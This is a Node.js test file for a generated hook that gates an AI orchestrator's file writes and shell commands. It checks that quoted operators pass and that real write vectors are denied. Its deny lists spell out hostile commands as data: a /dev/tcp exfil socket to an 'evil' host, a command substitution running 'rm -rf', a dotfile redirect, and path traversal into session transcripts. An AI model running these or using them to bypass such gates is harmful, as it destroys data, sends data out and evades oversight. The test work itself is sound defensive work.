import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { generateHooks } from '../generators/hooks-generator.js';
import { getProjectPaths } from '../utils/paths.js';
import { loadSwarmConfig } from '../utils/config.js';

// ── Gate honest-path regression corpus (F-26 / F-15) ────────────────────────
//
// STANDING RULE embodied as tests: a false-positive on an allow-listed,
// honest-path action is a P1 regression, so this corpus makes it fail LOUDLY.
// Two invariants are locked in against the REAL generated hook (process-spawn):
//
//   1. Honest-path MUST PASS. Quoting is respected — a shell-significant
//      operator (`>` `>>` `|` `#` `->` `$()` `` ` ``) INSIDE single or double
//      quotes is part of a word, never a redirect/pipe, so `rg "value > 5"`,
//      `git commit -m "a -> b"`, `grep -E "a|b"` are read-only inspection and
//      pass. (F-26 was the inverse: a quoted `>` misread as a redirect.)
//   2. Real write-vectors MUST STILL DENY. An UNQUOTED redirect into the tree,
//      a write-util, a wrapper/interpreter, an env-prefix smuggle, a
//      command-substitution that writes, a /dev exfil socket, and the memory
//      carve-out's out-of-scope siblings all stay denied. The corpus proves the
//      quote-awareness did NOT weaken real enforcement.
//
// Plus the F-15 carve-out: the orchestrator's own harness memory dir
// (<configDir>/projects/<slug>/memory) is writable by the FILE tools, scoped
// tightly to the /memory subtree of THIS project's slug — never the slug root
// (session .jsonl transcripts), other projects, or the rest of .claude/**.

describe('orchestrator-write-gate honest-path corpus (F-26 quoting / F-15 memory)', () => {
  const tmpDir = mkdtempSync(join(tmpdir(), 'bmad-gate-corpus-'));
  const projectDir = join(tmpDir, 'project');
  const homeDir = join(tmpDir, 'home');
  let hookPath;
  // The harness memory dir the hook computes for (CLAUDE_PROJECT_DIR=projectDir,
  // HOME=homeDir): <home>/.claude/projects/<slug>/memory where the slug is the
  // project path with every `/` and `.` replaced by `-` (Claude Code encoding).
  const slug = projectDir.replace(/[/.]/g, '-');
  const memDir = join(homeDir, '.claude', 'projects', slug, 'memory');
  const slugRoot = join(homeDir, '.claude', 'projects', slug);

  before(() => {
    mkdirSync(projectDir, { recursive: true });
    writeFileSync(join(projectDir, 'swarm.yaml'), 'project:\n  name: gate-corpus\n');
    const config = loadSwarmConfig(join(projectDir, 'swarm.yaml'));
    const paths = getProjectPaths(projectDir);
    generateHooks(config, paths);
    hookPath = join(paths.hooksDir, 'orchestrator-write-gate.cjs');
    // Create the memory dir so the realpath guard resolves a genuine ancestor.
    mkdirSync(memDir, { recursive: true });
  });

  after(() => { rmSync(tmpDir, { recursive: true, force: true }); });

  // Spawn the real hook as the orchestrator identity (no agent_id/agent_type).
  function decide(toolInput, extraEnv = {}) {
    const event = { tool_input: toolInput, cwd: projectDir };
    const res = spawnSync('node', [hookPath], {
      input: JSON.stringify(event),
      encoding: 'utf8',
      cwd: projectDir,
      env: {
        ...process.env,
        AGENT_ROLE: 'orchestrator',
        CLAUDE_PROJECT_DIR: projectDir,
        HOME: homeDir,
        CLAUDE_CONFIG_DIR: '', // force the $HOME/.claude default
        ...extraEnv,
      },
    });
    let decision = null;
    if (res.stdout && res.stdout.trim()) { try { decision = JSON.parse(res.stdout); } catch {} }
    return decision?.hookSpecificOutput?.permissionDecision === 'deny' ? 'deny' : 'allow';
  }
  const bash = (command) => decide({ command });
  const write = (file_path) => decide({ file_path });

  // ── 1. Honest-path shell commands — MUST PASS ────────────────────────────
  const SHELL_MUST_PASS = [
    // quoted comparison / redirect-looking operators (the F-26 class)
    ['rg quoted >', 'rg "value > 5" src/'],
    ['rg single-quoted >', "rg 'value > 5' src/"],
    ['grep quoted >>', 'grep "a >> b" file'],
    ['grep alternation | in quotes', 'grep -E "a|b" file'],
    ['rg alternation | in quotes', 'rg "TODO|FIXME" .'],
    ['commit msg with arrow ->', 'git commit -m "a -> b"'],
    ['commit msg with >> and <', 'git commit -m "old >> new (was < 3)"'],
    ['commit msg with pipe and gt', 'git commit -m "fix: pipe a|b and gt a>b"'],
    ['echo quoted pipe', 'echo "a | b"'],
    ['echo quoted &&', 'echo "x && y"'],
    ['rg quoted # comment', 'rg "# comment" src'],
    ['rg single-quoted $()', "rg '$(foo)' src"],
    ['rg single-quoted backticks', "rg 'a `b` c' src"],
    ['cat quoted redirect-looking arg', 'cat "notes > todo.txt"'],
    ['printf with literal >', 'printf "a>b\\n"'],
    // genuinely-safe redirects (allowed targets)
    ['stderr to /dev/null', 'git status 2>/dev/null'],
    ['stdout to /dev/null', 'ls > /dev/null'],
    ['fd-dup 2>&1', 'grep foo file 2>&1'],
    ['read redirect from /dev/null', 'wc -l < /dev/null'],
    // coordination + pipelines of read-only tools
    ['commit then push', 'git commit -m "msg" && git push'],
    ['log piped to grep', 'git log --oneline | grep fix'],
  ];
  for (const [name, cmd] of SHELL_MUST_PASS) {
    it(`ALLOW (honest): ${name}`, () => {
      assert.equal(bash(cmd), 'allow', `false-positive deny on honest command: ${cmd}`);
    });
  }

  // ── 2. Real write-vectors / bypasses — MUST STILL DENY ───────────────────
  const SHELL_MUST_DENY = [
    ['unquoted redirect into src', 'echo x > src/evil.js'],
    ['unquoted redirect, no spaces', 'echo x>src/evil.js'],
    ['append into src', 'echo x >> src/evil.js'],
    ['bare redirect', '> src/evil.js'],
    ['redirect after read cmd', 'cat f > src/evil.js'],
    ['tee into src (pipe writer)', 'echo x | tee src/evil.js'],
    ['real redirect trailing a quoted arg', 'rg "a > b" src > src/out.js'],
    ['node inline eval', 'node -e "process.exit(0)"'],
    ['python inline eval', 'python -c "x"'],
    ['compound: coord then redirect', 'git commit -m "ok"; echo x > src/a.js'],
    ['and-chain redirect', 'rg foo && echo x > src/a.js'],
    ['double-quoted cmd-subst executes', 'echo "$(rm -rf src)"'],
    ['cmd-subst body writes', 'echo $(echo x > src/a.js)'],
    ['non-benign env prefix', 'HOME=/tmp/e git log'],
    ['/dev/tcp exfil socket', 'echo hi > /dev/tcp/evil/80'],
    ['/dev/../ traversal into tree', 'echo x > /dev/../repo/src/a.js'],
    ['wrapper strace', 'strace node x'],
    ['git apply (tree mutation)', 'git apply patch'],
    ['git checkout pathspec (file restore)', 'git checkout -- src/a.js'],
    ['redirect to home dotfile', 'echo x > ~/.bashrc'],
    ['tee write-util leading', 'tee src/a.js'],
    ['dd write-util', 'dd of=src/a.js'],
    ['cp into src', 'cp /etc/x src/a.js'],
  ];
  for (const [name, cmd] of SHELL_MUST_DENY) {
    it(`DENY (write-vector): ${name}`, () => {
      assert.equal(bash(cmd), 'deny', `enforcement weakened — allowed a write-vector: ${cmd}`);
    });
  }

  // ── 3. F-15 harness memory carve-out — FILE tools ────────────────────────
  it('ALLOW: write the memory dir itself', () => assert.equal(write(memDir), 'allow'));
  it('ALLOW: write a memory fact file', () => assert.equal(write(join(memDir, 'some-fact.md')), 'allow'));
  it('ALLOW: write MEMORY.md index', () => assert.equal(write(join(memDir, 'MEMORY.md')), 'allow'));
  it('ALLOW: write a nested memory file', () => assert.equal(write(join(memDir, 'sub', 'nested.md')), 'allow'));
  it('ALLOW: memory dir via $CLAUDE_CONFIG_DIR override', () => {
    const cfg = join(tmpDir, 'altcfg');
    const altMem = join(cfg, 'projects', slug, 'memory');
    mkdirSync(altMem, { recursive: true });
    assert.equal(decide({ file_path: join(altMem, 'x.md') }, { CLAUDE_CONFIG_DIR: cfg }), 'allow');
  });

  // Memory scoping — MUST DENY (tight to /memory of THIS slug).
  const MEMORY_MUST_DENY = [
    ['slug-root .jsonl transcript', join(slugRoot, 'transcript.jsonl')],
    ['slug-root session file', join(slugRoot, 'session.jsonl')],
    ['other project memory', join(homeDir, '.claude', 'projects', '-home-other', 'memory', 'x.md')],
    ['global settings.json', join(homeDir, '.claude', 'settings.json')],
    ['projects root file', join(homeDir, '.claude', 'projects', 'x.md')],
    ['traversal out of memory to slug root', join(memDir, '..', 'transcript.jsonl')],
    ['traversal up two levels', join(memDir, '..', '..', 'evil.md')],
    ['memory-prefixed sibling dir (memoryX)', slugRoot + '/memory-evil/x.md'],
    ['project .claude/hooks', join(projectDir, '.claude', 'hooks', 'x.cjs')],
    ['project src', join(projectDir, 'src', 'x.js')],
    ['home dotfile', join(homeDir, '.bashrc')],
  ];
  for (const [name, p] of MEMORY_MUST_DENY) {
    it(`DENY (memory scoping): ${name}`, () => {
      assert.equal(write(p), 'deny', `memory carve-out leaked to: ${p}`);
    });
  }

  // The memory carve-out is FILE-TOOLS-ONLY: the shell path (isShellWritable)
  // never consults isHarnessMemoryWrite, so a redirect into the memory dir stays
  // denied. We prove this with a config dir OUTSIDE /tmp — under /tmp the gate's
  // pre-existing scratch-space fast-path would allow the redirect for an
  // unrelated reason and mask the property. `/opt/...` need not exist: the shell
  // write set rejects it regardless, and (critically) the SAME memory path the
  // FILE tool would accept is refused here.
  it('DENY: shell redirect into the memory dir (file-tools-only carve-out)', () => {
    const cfg = '/opt/bmad-nonexistent-cfg';
    const shellMem = join(cfg, 'projects', slug, 'memory', 'y.md');
    assert.equal(decide({ command: `echo x > ${shellMem}` }, { CLAUDE_CONFIG_DIR: cfg }), 'deny');
    // ...while the FILE tool accepts that very same memory path.
    assert.equal(decide({ file_path: shellMem }, { CLAUDE_CONFIG_DIR: cfg }), 'allow');
  });
});
